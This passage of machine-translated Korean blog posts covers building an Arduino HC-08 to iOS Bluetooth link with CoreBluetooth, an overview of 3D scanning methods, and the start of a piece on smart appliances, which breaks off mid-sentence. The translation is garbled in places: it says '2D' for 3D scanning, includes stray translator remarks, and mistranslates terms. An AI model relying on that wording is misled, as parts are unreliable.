때에만 실행되는 함수), 아두이노와 컴퓨터 사이에 표준 시리얼 포트를 통해 초당 9600비트의 속도로 시리얼 통신을 시작합니다 (디버깅에 유용합니다).\n\n\n\n이제 \"블루투스\"라고 불리는 객체의 직렬 통신을 9600 비트로 설정하여 시작합니다. 이는 아두이노와 핀 2와 3에 연결된 블루투스 모듈 간의 통신을 수립합니다.\n\n```js\nvoid loop() {\n    bluetooth.print(\"성공!\"); \n    delay(2000);\n    bluetooth.print(\"잘 했어요!\");\n    delay(2000);\n}\n```\n\n이제 우리의 루프에서는 코드가 계속해서 실행되며, 기본적으로 블루투스 모듈과 통신하도록 한 책임자에게 문자열을 보내고 있습니다. 매 2초마다 다른 문자열을 보내고 있습니다.\n\n이 코드 스니펫의 아이디어는 여러분의 프로젝트에 맞는 데이터를 가져와 생성된 통신으로 보내는 것입니다. 이 경우 문자열만 보내고 있지만 다양한 유형의 데이터를 보낼 수 있습니다.\n\n\n\n# iOS 프로젝트\n\n지금까지 배운 것으로는, 코드와 아두이노가 준비가 되어 블루투스 장치와 연결하고 정보를 전송할 수 있게 되었어요. 이제는 SwiftUI iOS 프로젝트를 만들어야 할 때입니다.\n\n# XCode 권한\n\nXCode에서 프로젝트를 생성한 후, \"info.plist\"에 블루투스 사용을 추가해야 합니다. 그러면 애플리케이션이 사용자에게 다른 블루투스 장치에 연결할 권한을 요청할 수 있어요.\n\n\n\n프로젝트 파일에 액세스하고 \"info\" 탭에 들어가야 해요. 그 화면에 들어가면 기존 항목 위에 마우스 포인터를 두고 \"＋\"를 클릭해서 \"Privacy — Bluetooth Peripheral Usage Description\"을 추가해야 해요.\n\n우리가 추가할 이 권한은 사용자에게 Bluetooth 장치에 연결할 권한을 요청하는 것이에요. \"value\"는 연결을 요청하는 메시지로 사용자에게 표시될 거에요.\n\n그런데 다른 권한인 \"Privacy — Bluetooth always usage Description\"도 있어요. 이 권한은 앱이 종료되어도 계속 Bluetooth을 사용하도록 사용자에게 요청하는데, 우리가 여기서 제안한 프로젝트에는 필요 없는 권한이에요.\n\n권한을 추가한 후에는 우리의 \"info\" 목록에 새로운 줄이 이렇게 보여야 해요:\n\n\n\n# Swift 코딩\n\n이제 Arduino를 준비하고 Bluetooth를 사용하기 위한 필수 권한을 설정했으니, 코드 작성을 시작할 수 있습니다.\n\n이 맥락에서, 이 기사에서 \"BluetoothController\"라고 부르는 부분만 설명하겠습니다. 이 컨트롤러에서 수집된 정보와 데이터를 표시하는 뷰는 GitHub에서 액세스할 수 있지만, 기본적으로 컨트롤러에서 수집된 정보와 데이터를 표시합니다.\n\n이 매체 기사의 이 부분에서 설명하고자 하는 섹션을 넣은 다음, 더 작은 섹션으로 나누어 각각 설명하겠습니다. 세 개의 점을 통과할 때마다, 새로운 섹션을 설명하기 시작함을 나타냅니다.\n\n\n\n이렇게 할 것입니다:\n\n```js\nimport Foundation\nimport CoreBluetooth\nclass BluetoothController: NSObject, ObservableObject, CBPeripheralDelegate {\n    \n    private var centralManager: CBCentralManager!\n    \n    @Published var connectedPeripheral: CBPeripheral?\n    @Published var discoveredPeripherals = [CBPeripheral]()\n    @Published var isConnected = false\n    @Published var bluetoothStatus: BluetoothStatus = .off\n    @Published var valueReceived: String?\n   \n    override init() {\n        super.init()\n        centralManager = CBCentralManager(delegate: self, queue: nil)\n        centralManagerDidUpdateState(centralManager)\n    }\n}\n```\n\n\"BluetoothController\"은 뷰에서 정보에 액세스할 것이므로 observable해야 하고, ObjectiveC stuff를 사용할 예정이므로 NSObject여야 하며, 연결될 블루투스 장치(페리페럴)로부터 이벤트를 처리할 수 있는 메서드를 정의하는 CoreBluetooth가 제공하는 프로토콜인 CBPeripheralDelegate를 준수해야 합니다.\n\n```js\nprivate var centralManager: CBCentralManager!\n```\n\n\n\n우리는 CBCentralManager 타입의 centralManager 변수를 생성했습니다. 이는 CoreBluetooth에서 제공하는 타입으로, BLE 통신에서 중심 역할을 하는 Bluetooth \"페리페랄\"과 통신 관리를 담당합니다.\n\n```js\n@Published var connectedPeripheral: CBPeripheral?\n@Published var discoveredPeripherals = [CBPeripheral]()\n@Published var isConnected = false\n@Published var bluetoothStatus: BluetoothStatus = .off\n@Published var valueReceived: String?\n```\n\n생성된 이 변수들은 화면에 표시할 정보입니다.\n\n```js\noverride init() {\n        super.init()\n        centralManager = CBCentralManager(delegate: self, queue: nil)\n        centralManagerDidUpdateState(centralManager)\n}\n```\n\n\n\n마지막으로, init을 사용하여 우리의 슈퍼클래스인 NSObject을 초기화하는 init 메서드가 있습니다. 여기서 모든 BluetoothController의 추가 설정을 제공하기 전에 NSObject에서 제공하는 모든 것을 초기화합니다.\n\ncentralManager = CBCentralManager(delegate: self, queue: nil) - 이 줄은 Bluetooth 통신을 위한 \"중앙 매니저\"인 CBCentralManager의 인스턴스를 초기화합니다. 중앙 매니저의 \"delegate\"를 self로 설정하여 BluetoothController 인스턴스가 Bluetooth 이벤트에 관련된 반환을 받게 됩니다. 상태 변경, 페리페럴 발견 등과 관련된 반환에 대한 delegate로서 센트럴 매니저가 메인 디스패치 큐를 사용할 것을 나타내는 queue 매개변수는 nil로 설정되어 있습니다.\n\ncentralManagerDidUpdateState(centralManager) - 이 줄은 BluetoothController의 centralManagerDidUpdateState 메서드를 직접 호출합니다. 이 메서드는 CBCentralManagerDelegate 프로토콜의 일부이며 Bluetooth 상태가 변경될 때 호출됩니다. 센트럴 매니저를 초기화한 후 이 메서드를 직접 호출함으로써 BluetoothController 인스턴스가 초기화 직후 현재 Bluetooth 상태를 처리할 수 있도록 보장됩니다.\n\n```js\nextension BluetoothController: CBCentralManagerDelegate {\n    \n    func centralManagerDidUpdateState(_ central: CBCentralManager) {\n        switch central.state {\n        case .poweredOn:\n            centralManager.scanForPeripherals(withServices: nil, options: nil)\n            bluetoothStatus = BluetoothStatus.on\n            \n        case .poweredOff:\n            self.connectedPeripheral = nil\n            self.discoveredPeripherals = []\n            self.isConnected = false\n            self.valueReceived = nil\n            bluetoothStatus = BluetoothStatus.off\n            \n        case .resetting:\n            // Wait for next state update and consider logging interruption of Bluetooth service\n            bluetoothStatus = BluetoothStatus.resetting\n            \n        case .unauthorized:\n            // Alert user to enable Bluetooth permission in app Settings\n            bluetoothStatus = BluetoothStatus.unathorized\n            \n        case .unsupported:\n            // Alert user their device does not support Bluetooth and app will not work as expected\n            bluetoothStatus = BluetoothStatus.unsupported\n            \n        case .unknown:\n            // Wait for next state update\n            bluetoothStatus = BluetoothStatus.unknown\n            \n        @unknown default:\n            print(\"---Default case---\")\n        }\n    }\n```\n\n\n\n\"centralManagerDidUpdateState\" 메서드 내에서 중앙 매니저의 현재 상태에 따라 다양한 조치가 취해집니다:\n\n- .poweredOn: Bluetooth가 켜져 있으면 중앙 매니저가 블루투스 장치를 스캔하기 시작합니다\n- .poweredOff: Bluetooth가 꺼져 있으면, 이미 발견되거나 연결된 장치에 대한 모든 참조를 지우고 Bluetooth를 다시 켤 때 모두 다시 발견해야 합니다.\n\n각 상태마다 적절한 처리를 해야 하며, 이 경우에는 블루투스 상태를 현재 상태로 설정하고 이러한 경우를 처리한 것이 아니라는 점을 유의하십시오. 그러나 각 상태가 의미하는 바는 문서에서 찾을 수 있습니다.\n\n본 코드는 본질적으로 Bluetooth 상태 변화를 모니터하고 이에 적절하게 대응하여 애플리케이션이 이러한 변화에 적절하게 반응하도록 보장합니다.\"\n\n\n\n```swift\nfunc centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral, advertisementData: [String : Any], rssi RSSI: NSNumber) {\n    if !peripheralAlreadyRegistered(peripheral: peripheral){\n        discoveredPeripherals.append(peripheral)\n    }\n}\n\nfunc peripheralAlreadyRegistered(peripheral: CBPeripheral) -\u003e Bool{\n    return discoveredPeripherals.contains(peripheral)\n}\n```\n\n이제 CentralManager가 감지하는 이벤트에 따라 자동으로 호출되는 일련의 메소드를 입력할 것입니다. 예를 들어, 이전에 블루투스가 켜져 있음을 감지했을 때 \"peripheral\"를 스캔하기 시작했고, 발견하자마자 첫 번째 함수 \"didDiscover\"에 들어갔습니다. 여기에는 발견된 페리페럴과 함께 수행할 작업이 포함되어 있습니다.\n\n이 경우에는 기본적으로 이미 발견되었는지 확인한 후, 아직 발견되지 않은 경우에만 발견된 페리페럴을 발견된 페리페럴 배열에 추가했습니다(뷰에 표시될 배열이며 사용자가 어떤 페리페럴에 연결할지 선택할 수 있도록 표시됩니다).\n\n\n\n```js\nfunc connect(peripheral: CBPeripheral) {\n    centralManager.connect(peripheral, options: nil)\n}\n\nfunc centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {\n    self.connectedPeripheral = peripheral\n    self.isConnected = true\n\n    peripheral.delegate = self\n    peripheral.discoverServices(nil)\n}\n```\n\n여기에는 뷰에서 선택된 페리페럴에 연결하는 데 책임이 있는 두 가지 함수가 있습니다. 발견된 장치 목록에서 페리페럴을 클릭하면 \"connect\" 함수를 호출하여 중앙 관리자에게 매개변수로 전달된 페리페럴과의 연결을 요청합니다.\n\n연결이 성공하면 Bluetooth 모듈의 LED가 깜박이는 것이 멈추고 켜져 있어야 합니다.\n\n연결이 성공하면 자동으로 CentralManager 함수 \"didConnect\"로 들어가며, 이 경우에:\n\n\n\n\n- 연결된 장치에 대한 참조(connectedPeripheral)를 저장합니다.\n- 연결된 주변 장치의 \"대리자(delegate)\"로서 객체 자체의 정의. 이를 통해 객체는 주변 장치에서 발생하는 이벤트에 대한 알림을 받을 수 있습니다.\n- 연결된 주변 장치로부터 서비스(블루투스 장치가 제공하는 \"기능\"들에 대해 계속 논의됩니다)를 검색을 시작합니다.\n\n```js\nfunc centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {\n    // 오류 처리\n    print(\"주의: 연결 실패\")\n}\n```\n\n다른 함수가 이것을 호출할 수 있는데, 해당 주변 장치에 연결을 시도할 때 연결에 실패했을 때입니다. 이 경우 콘솔에 연결이 실패했다는 메시지를 출력했지만, 이 시나리오를 처리해야 합니다.\n\n```js\nfunc disconnect() {\n    guard let peripheral = connectedPeripheral else {\n        return\n    }\n    centralManager.cancelPeripheralConnection(peripheral)\n}\n\nfunc centralManager(_ central: CBCentralManager, didDisconnectPeripheral peripheral: CBPeripheral, error: Error?) {\n    self.connectedPeripheral = nil\n    self.discoveredPeripherals = []\n    self.isConnected = false\n    self.valueReceived = nil\n        \n    centralManager.scanForPeripherals(withServices: nil, options: nil)\n}\n```\n\n\n\n이제 영구적으로 주변 장치와 연결되어 있지 않도록 연결을 해제하는 기능이 있습니다. 이 기능은 우리가 무엇에 연결돼 있는지 확인한 후, CentralManager에 연결을 취소하도록 요청합니다.\n\n이 연결을 취소하면, 이전에 연결돼 있던 것이 더 이상 연결되지 않았으므로 발견된 장치와 연결된 모든 참조를 지우기로 결정했습니다. 게다가, 주변 기기를 연결하고 30m를 걸어가서 이미 발견한 다른 기기를 잃는 경우도 있을 수 있으므로, 그들의 참조를 삭제하여 더 이상 존재하지 않는 것에 연결하려고 하지 않도록 합니다.\n\n그 후, 다시 주변에 있는 주변 기기를 찾기 시작합니다.\n\n# 서비스\n\n\n\n기본적으로, 서비스는 주변 장치에서 제공되는 기능을 나타내는 특성의 모음입니다. 각 서비스는 하나 이상의 특성을 포함할 수 있으며, 이러한 특성은 주변 장치에서 제공되는 특정 정보를 나타냅니다.\n\n예를 들어, Bluetooth 주변 장치는 \"온도 센서\" 서비스를 가질 수 있으며, 이 서비스에는 센서가 측정한 현재 온도를 제공하는 특성이 포함될 수 있습니다. 또한 \"LED 제어\" 서비스를 가질 수 있으며, 이 서비스에는 LED를 켜거나 끄고 색상을 설정하는 특성이 포함될 수 있습니다.\n\n```js\nfunc peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {\n        guard peripheral.services != nil else {\n            return\n        }\n        discoverCharacteristics(peripheral: peripheral)\n}\n```\n\n장치와의 연결이 끊기거나 연결이 실패할 가능성을 다룬 후, 이전에 서비스를 찾는 함수를 호출한 지점으로 돌아가서, 발견된 서비스가 있을 때 이 함수에 들어가는데, 이것은 이제 CBPeriperalDelegate의 메서드이고 더 이상 CentralManager의 메서드가 아니기 때문에 제 주변 장치에서 발생하는 이벤트는 CBPeripeheralDelegate의 메서드를 통해 처리해야 합니다.\n\n\n\n우리가 서비스 검색 시 호출되는 함수는 기본적으로 해당 장치에 서비스가 있는지 확인하고, 서비스가 있는 경우 해당 서비스의 특성을 찾도록 요청합니다.\n\n```js\nfunc discoverCharacteristics(peripheral: CBPeripheral) {\n    guard let services = peripheral.services else {\n        return\n    }\n    \n    for service in services {\n        peripheral.discoverCharacteristics(nil, for: service)\n    }\n}\n\nfunc peripheral(_ peripheral: CBPeripheral, didDiscoverCharacteristicsFor service: CBService, error: Error?) {\n    guard let characteristics = service.characteristics else {\n        return\n    }\n    \n    for characteristic in characteristics {\n        if characteristic.uuid == CBUUID(string: \"FFE1\") {\n            if characteristic.properties.contains(.notify) {\n                peripheral.setNotifyValue(true, for: characteristic)\n            }\n            \n            self.connectedPeripheral?.readValue(for: characteristic)\n            break\n        }\n    }\n}\n```\n\n첫 번째 함수는 간단히 발견된 모든 서비스에 있는 특성을 검색하도록 요청합니다. 이러한 특성을 찾으면, CBPeripheralDelegate 대리자가 이 이벤트를 식별하고 \"didDiscoverCharacteristics\" 메서드를 호출합니다.\n\n이 메서드에서는 특성 목록이 null이 아닌지 확인하고, 그 후에 찾은 모든 특성을 특성 식별자가 \"FFE1\"인 특성을 찾아냅니다. 이는 우리가 원하는 값을 제공하는 특성이며 값이 변경될 때 경고해주는 notify 속성을 가지고 있습니다.\n\n\n\n그 후에 이 속성에 포함된 값이 무엇인지를 읽습니다.\n\n# 주의\n\nHC-08 모듈을 사용하는 이 프로젝트의 경우, 찾고 있는 ID는 \"FFE1\"입니다. 그러나 다른 모듈을 사용 중이라면 ID가 다를 수도 있습니다.\n\n찾아야 할 기능이 무엇인지 알아보려면 모듈 또는 아두이노의 데이터 시트를 읽는 것을 추천합니다. 또한 \"LightBlue\"라는 앱을 사용하여 장치에 연결하고 장치가 제공하는 서비스에 대한 정보를 포함하여 장치에 대한 몇 가지 정보를 제공할 수 있습니다.\n\n\n\nHC-08 모듈을 사용하는 분들을 위해 gitHub에 데이터 시트를 올려두었어요.\n\n![Bluetooth connection between Arduino and iOS](/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_2.png)\n\n```swift\nfunc peripheral(_ peripheral: CBPeripheral, didUpdateValueFor characteristic: CBCharacteristic, error: Error?) {\n        if let value = characteristic.value {\n            if let stringValue = String(data: value, encoding: .utf8) {\n                valueReceived = stringValue\n            }\n        }\n    }\n```\n\n마지막으로 값을 읽기 위해 요청한 후, 값이 변경되면 \"didUpdateValueFor\" 메서드에 들어가게 되는데, 이 메서드는 받은 값을 문자열로 변환하는 역할을 담당합니다 (이 프로젝트의 목적은 아두이노에서 보내는 두 문자열을 표시하는 것이기 때문이죠).\n\n\n\n그러나 당신의 프로젝트에서는 받고 싶은 데이터 유형으로 변환할 수 있고, 심지어 데이터를 받기 전에 값이 업데이트되길 기다리지 않고도 이 변환을 수행할 수 있습니다. 하지만 이 경우에는 매 두 초마다 문자열을 변경하는 것이 목표였습니다.\n\n# 결론\n\n우리는 다음을 구축했습니다.\n\n- 블루투스 장치와 통신하고 데이터를 수신할 수 있는 클래스;\n- 아두이노에서 블루투스 모듈을 사용하는 방법을 배웠습니다;\n- 아두이노와 iOS가 블루투스를 통해 통신할 수 있도록 만들었습니다.\n\n\n\n저희의 다음 단계로, BluetoothController에서 제공하는 정보에 액세스하여 원하는 뷰에서 사용해야 합니다.\n\n소스 코드는 제 GitHub에서 확인해주세요.\n도움이 되었기를 바랍니다!🫡","ogImage":{"url":"/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png"},"coverImage":"/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png","tag":["Tech"],"readingTime":14},{"title":"2D 스캐닝 방법 개요","description":"","date":"2024-05-15 04:23","slug":"2024-05-15-AnOverviewofKey2DScanningMethods","content":"\n\n\u003cimg src=\"/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_0.png\" /\u003e\n\n3D 스캔은 실제 세계의 물체나 환경을 분석하여 모양, 색상 및 잠재적으로 외관이나 다른 표면 특성에 대한 데이터를 수집하는 과정입니다. 수집된 데이터는 이후 제조, 품질 관리 및 문화 유산 보존과 같은 다양한 응용 분야에서 사용하기 위해 디지털 3D 모델을 구축하는 데 사용될 수 있습니다.\n\n오늘날 많은 기술이 있으며, 이러한 기술은 물리적 물체를 정확하게 2차원으로 스캔하는 데 다른 원리를 이용합니다. 이 문서는 다섯 가지 주요 방법을 비교하여 M - 각 방법이 기본적으로 어떻게 작동하는지 설명하고 상대적인 장단점을 강조합니다.\n\n목차\n\n\n\n- 레이저 삼각측량\n- 사진측량\n- 구조빛\n- 레이저 펄스 거리측정\n- 접촉 수치화\n- 스캔 방법의 트레이드오프 정리:\n- 결론\n\n# 레이저 삼각측량\n\n![이미지](/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_1.png)\n\n레이저 삼각측량 스캐너는 오늘날 매우 흔한 유형의 2D 스캐닝 하드웨어입니다. 이름에서 알 수 있듯이, 이 스캐너는 삼각측량을 통해 표면을 분석하기 위해 레이저 빔을 활용합니다.\n\n\n\n개발자이시군요. 위의 텍스트를 친근한 톤으로 한국어로 번역해 드리겠습니다.\n\n물체를 스캔할 때 단일 레이저 점 또는 선이 물체에 투사됩니다. 이 레이저 광선은 표면에서 반사되어 센서에 의해 이미지화됩니다. 반사된 광선의 각도는 원래 방향과의 상대적인 각도를 인코딩하여 표면을 매핑하는 데 사용할 수 있는 거리 정보를 부호화합니다. 이 프로세스는 2D 스캔을 구축하기 위해 물체 전체에 걸쳐 반복됩니다.\n\n장점:\n- 복잡한 물체 세부 정보를 캡처하는 데 매우 높은 해상도와 스캔 정확도\n- 빠른 스캔 속도\n\n제한 사항:\n\n\n\n- 다양한 표면 특성에 민감함 - 투명 또는 광택 마무리는 문제가 될 수 있음\n- 한 줄의 레이저만 있어서 스캔 시간이 길어짐\n\n전체적으로 레이저 삼각측량은 구현이 쉬우면서도 정밀도가 높습니다. 이는 제조된 부품을 CAD 모델과 비교하는 품질 보증 작업과 같은 작업에 이상적으로 적합합니다.\n\n# 사진측량\n\n![image](/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_2.png)\n\n\n\n포토그램메트리는 2D 사진으로부터 측정을 하는 과학이에요. 특히 표면 점들의 정확한 위치를 재구성하기 위해 사용돼. 이 원칙은 서로 다른 각도에서 주제물을 촬영한 사진들의 시리즈로부터 완전한 2D 모델을 만들 수 있는 포토그램메트리 스캐닝 시스템에 의해 활용돼.\n\n전문 알고리즘이 여러 사진에서 공통 점을 분석해. 초점 거리와 같은 카메라 파라미터 정보를 이용하여 수십만 개의 표면 점이 물리적으로 접촉하지 않고도 높은 정확도로 표시될 수 있어.\n\n장점:\n\n- 완전 비접촉 프로세스로 소박하거나 원격으로 스캔 가능\n- 복잡한 기하학을 가진 물체에 대해 다른 기술들보다 우수한 성과를 보여줘.\n\n\n\n제약 사항:\n\n- 0.1mm보다 더 높은 정밀도 달성이 어려움\n- 계산 집약적인 분석은 스캔 소프트웨어/하드웨어에 높은 수요를 야기함\n\n사진측량은 삼각측량 스캔의 정확도에는 미치지 못하지만, 컴퓨터 비전과 계산 파워의 지속적인 향상으로 이러한 제약을 덜 제한적으로 만들고 있습니다.\n\n# 구조물 조명\n\n\n\n\n![Image](/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_3.png)\n\nThe structured light scanning approach is similar to laser triangulation, but substitutes the single laser with a structured pattern of light projected onto objects. This pattern might be bars, grids, or other shapes that establish a frame of reference.\n\nThe way that these shapes deform when striking surfaces encodes detailed information about the surface itself. This allows for reconstructing the surface geometry in fine detail. Common light patterning techniques include digital light processing (DLP) projectors or laser speckle projectors if coherent laser light is preferred.\n\nBenefits:\n\n\n\n\n- 빠른 비접촉 스캔 방법\n- 로봇 레이저 스팟과 다르게 표면 색상/질감도 포착함\n\n한계:\n\n- 주변 조명 조건에 민감함\n- 그림자 효과가 데이터 수집에 방해할 수 있음\n\n구조광 시스템의 속도와 다용도성은 인라인 산업 스캔 응용에 적합합니다. 또한 마이크로소프트 키넥트와 같은 소비자 기기를 통해 대중에 널리 보급되고 있습니다.\n\n\n\n# 레이저 펄스 거리 측정\n\n![image](/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_4.png)\n\n레이저 펄스 거리 측정은 레이저 펄스의 시간을 측정하는 방식으로 작동합니다. 핵심 원리는 레이저 빛이 방출된 후 반사된 빛을 감지하는 사이의 시간 지연을 측정하는 것입니다. 빛의 속도가 알려진 상수이기 때문에 이 시간 간격을 계산하면 이동한 거리를 예측할 수 있습니다.\n\n스캐너는 초점을 맞춘 레이저 펄스의 회전을 대상물에 걸쳐 휘게 하여, 정밀한 시간-비행 거리 측정값을 수백만 개 만들어냅니다. 이 데이터는 주제 표면의 상세한 3D 지도로 변환됩니다.\n\n\n\n혜택:\n\n- 약 0.3mm 정밀도까지 극도의 높은 정확성\n- 수백 미터 범위에 이르는 큰 스캔 거리\n\n제한 사항:\n\n- 레이저 에너지를 너무 많이 흡수하는 어두운 물체에 대한 어려움\n-비용 증가와 빠른 처리가 필요합니다.\n\n\n\n레이저 펄스 거리 측정의 뛰어난 정확성과 범위는 건물 현장을 측량하여 항공 스캔에서 디지턤 지형지도를 만드는 등 다양한 대규모 스캔 요구에 적합합니다.\n\n# 연락처 디지타이징\n\n![이미지](/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_5.png)\n\n이름 그대로 연락처 디지타이징은 계측 장치와 대상 표면 간의 물리적 접촉을 기반으로 하는 방식으로서 치수 데이터를 수집합니다. 이는 터치 프로브, 계측 팔, 또는 표면에 XYZ 좌표를 플로팅할 수 있는 다른 장치를 활용할 수 있습니다.\n\n\n\n컨택 디지타이저는 손으로 윤곽을 따를 때, 밀리미터의 작은 부분까지 정밀하게 측정할 수 있습니다. 연속 스캔 과정을 통해 광택이나 투명한 재질과 같이 이미지 촬영이 어려운 표면도 정확히 잡을 수 있습니다.\n\n장점:\n\n- 약 0.05mm까지의 정밀도로 골드 스탠다드 제공\n- 투명/반사/볼록한 표면에 효과적\n\n제한사항:\n\n\n\n- 수작업 시간이 많이 소모됩니다.\n- 표면 접근이 필요하기 때문에 대상 크기/기하학이 제한됩니다.\n\n치과 임플란트나 조각물 복제와 같은 특수 응용에 적합한 맞춤형 접촉 디지타이징 방식은 서브밀리미터 수준의 완벽함이 중요합니다.\n\n# 스캔 방법의 대안들을 요약하면:\n\n![image](/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_6.png)\n\n\n\n위의 비교를 통해 특정 스캐닝 기술이 다른 경우에 비해 어떻게 높은 성능을 발휘하는지 알 수 있어요 — 각 접근 방식에 내재된 장단점을 잘 활용하고 있거든.\n\n# 요약\n\n이것은 우리의 능력을 확장시키는 2D 스캐닝을 통해 물리적 객체와 장면을 디지털화하는 다양하고 널리 사용되는 5가지 방법에 대한 짧은 소개였어요. 레이저 거리측정, 카메라 이미지, 투사된 빛 패턴 등을 활용한 방법을 통해 과학자들은 전문적인 용도에 사용되는 고상세 연락처 디지털화와 다재다능한 비접촉 스캐닝을 만들어 냈어요.\n\n자동 스캐닝은 수동 측정보다 수백 배 빠를 뿐만 아니라 더 뛰어난 정확도를 제공하기도 해요. 이를 통해 품질 보증, 아카이빙, 제품 설계에 대한 효율성이 증대되며, 레이저 삼각측량과 사진측량과 같은 현재의 기술을 향상시키는 노력이 계속되고 있어요. 실제로, 정밀도, 작업 공간 크기, 획득 속도의 한계를 넘어서 물리적 세계를 디지털 세계로 끌어오는 최첨단 기술이 형성되고 있어요.\n\n\n\n산업, 유산, 또는 창의적 목적으로 2D 스캔 어플리케이션을 사용해본 경험이 있나요? 의견란에서 여러분의 직접적인 시각을 공유해주세요!\n\n이 게시물은 원문이 3dprintjunction.com에 게시되었습니다.\n저희의 작업을 지원해주신 모든 분들께 감사드리며, 더 많은 유사한 기사들을 확인하시려면 3dprintjunction.com을 방문해주시기를 부탁드립니다.","ogImage":{"url":"/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_0.png"},"coverImage":"/assets/img/2024-05-15-AnOverviewofKey2DScanningMethods_0.png","tag":["Tech"],"readingTime":5},{"title":"내 멍청한 주전자를 축하하며","description":"","date":"2024-05-15 04:18","slug":"2024-05-15-InCelebrationofMyDumbKettle","content":"\n\n![image](/assets/img/2024-05-15-InCelebrationofMyDumbKettle_0.png)\n\n작년에 유투브 동영상으로 사람들에게 주방 가전제품을 재설정하는 방법을 보여줌으로써 5,000달러 이상을 벌었어요.\n\n이건 자랑하는 게 아니에요 - 이건 실제로 심각한 문제의 증거에요. 예전에는 간단한 장치조차 방대한 수의 모드, 메뉴 및 \"스마트\" 기능을 갖춘 심각한 복잡성을 보이게 되었어요.\n\n이러한 장치들은 고장이 잘 발생하는 센서, 칩 및 기계 학습 기능으로 가득하고 있어요. 생성 AI의 출현과 함께 상황이 훨씬 더 나빠지고 더 위험해질 거에요.\n\n\n\n## 토스터 전원 사이클링\n\n요즘, 베이글을 구우려고 했는데 제 꽤 멋진 Cuisinart 스마트 토스터의 화면이 멈춰 있는 걸 발견했어요.\n\n플러그를 그냥 뽑아 꽂으면 리부팅되지 않고 같은 화면이 그대로 남아 있는 걸 깨닫고 몇 분을 고민했어요.\n\n결국 올바른 절차를 기억해냈는데, 그것은 특정한 시간동안 조절기를 누르고 토스터의 펌웨어가 다시 부팅되기를 기다린 후 홈 메뉴로 돌아가야 했어요. 이 과정을 거쳐, 조금 좌절스러운 기분으로 아침을 준비할 수 있었답니다.\n\n\n\n토스터를 다시 시작하는 아이디어는 1990년대의 재미있는 농담처럼 느껴질 수 있어요. 하지만 컴퓨터 칩의 비용이 하락하면서 디자이너들이 사용할 수 있는 센서의 종류가 증가하고, 무선 연결성이 저렴해져서 심지어 간단한 기기에도 내장하기 쉬워져서, 이른바 \"스마트\" 가전제품이 급부상했어요.\n\nStatista에 따르면, 2024년에 스마트 가전제품은 112억 달러 규모의 산업이 될 것으로 예상돼요. 2028년까지 4500만 명 이상의 미국인이 스마트 가전제품을 일상생활에서 사용할 것으로 예상돼요.\n\n스마트 기술은 이미 우리 주변에 있어요, 찾아보면요. 제 아마존 스마트 전자레인지는 인터넷에 연결되어 제 목소리에 반응해요. 저의 Aeris 주방 공기 청정기는 자동으로 레인지에서 무언가를 태운 것을 감지하면 자동으로 파워를 높여 공기를 청소해요.\n\n제 Nest 온도 조절기는 제가 집에 있는지 알고, 내 선호도에 맞추어 열을 조절해요 (그리고 저가 밖에 있을 때는 제 개인 선호도보다는 우선적으로 제 개를 Lance의 선호도를 고려해요).\n\n\n\n## 똑똑한 세탁기\n\n그것은 출발에 불과합니다. 오늘의 스마트 가전제품들은 종종 제조사들이 \"AI\"로 마케팅하는 내장된 기계 학습 알고리즘을 통합합니다. 이러한 알고리즘들은 그들이 그들이 그 밖에 일상적인 일에 사고와 분석의 모습을 더합니다.\n\n예를 들어 내 LG 세탁기는 센서를 사용하여 내가 넣은 천의 정확한 종류를 감지하고 이에 따라 세탁 시간과 온도를 조절합니다. 그런 다음 이 정보를 동료인 내 LG ThinQ 건조기에 전달합니다. 세탁물을 말릴 때 건조기는 이미 어떤 내용물을 포함할지 인식하고 바지를 녹이지 않기 위해 열을 조절할 수 있습니다.\n\n많은 신제품들이 이를 더 나아가는 방향으로 발전하고 있습니다. 삼성의 Family Hub 냉장고는 내부 카메라와 AI를 사용하여 넣은 식품을 감지합니다. 그런 다음 당신이 가지고 있는 것을 기반으로 저녁 식사 레시피를 제안합니다.\n\n\n\nLG에서 가져온 AI 기반 오븐을 최근에 테스트해봤는데, 이 오븐은 기계 학습을 이용하여 닭 요리가 피부가 바삭바삭해질 때 알려줘요. 핸드폰에 알림이 오면 요리를 꺼내서 먹을 준비를 할 수 있어요.\n\n## Edge를 향해 달린다\n\n이런 기능들은 정말 멋진 재주 중 하나에요. 그러나 대부분의 경우, 오늘날 \"AI 기반\"으로 마케팅되는 스마트 기능들은 간단한, 초기 세대의 기계 학습 알고리즘을 사용해 그럴듯하게 작동하는 것 뿐이예요.\n\n예를 들어, 제 스마트 세탁기는 옷의 반사율을 결정하기 위해 적외선 센서를 사용하고 (그리고 이것으로 옷의 재질에 대한 대략적인 개념을 얻을 수 있을 거에요), 드럼에 장착된 중량 센서를 사용하여 넣은 옷의 상대적 중량을 계산할 수 있어요.\n\n\n\n그런 다음, 간단한 룩업 기능을 수행하여 내 부하의 매개변수를 11,000개의 미리 저장된 프로필과 비교합니다. 그 라이브러리에서 가장 유사한 항목을 찾으면 해당 매치의 미리 저장된 설정을 가져와 해당 설정으로 세탁주기를 실행합니다.\n\n이것은 도움이 되고 인상적입니다, 맞아요. 그러나 세탁기는 실제로 AI를 사용하지는 않습니다. 대신, 주로 똑똑한 센서와 매우 기본적인 알고리즘, 즉 간단한 패턴 매칭을 사용하여 더 깊이있는 지능을 모방합니다.\n\n그러나 생성 AI가 발전함에 따라 가전제품들은 정말로 스마트하고 빠르게 발전할 것입니다.\n\n2023년 말에, 구글은 새로운 Gemini 대형 언어 모델 (LLM)을 발표하였는데, 이는 OpenAI의 보편적인 GPT 모델의 경쟁 상품입니다. Gemini Ultra가 모든 주목을 받았지만, 구글은 그들의 생성 AI 기술의 혁신적인 버전 중 하나인 Gemini Nano도 발표했습니다.\n\n\n\n나노는 완전한 LLM이지만 모바일 기기에서 실행되도록 최적화되어 있어요. 현재 LLM은 너무 복잡하고 계산 비용이 많이 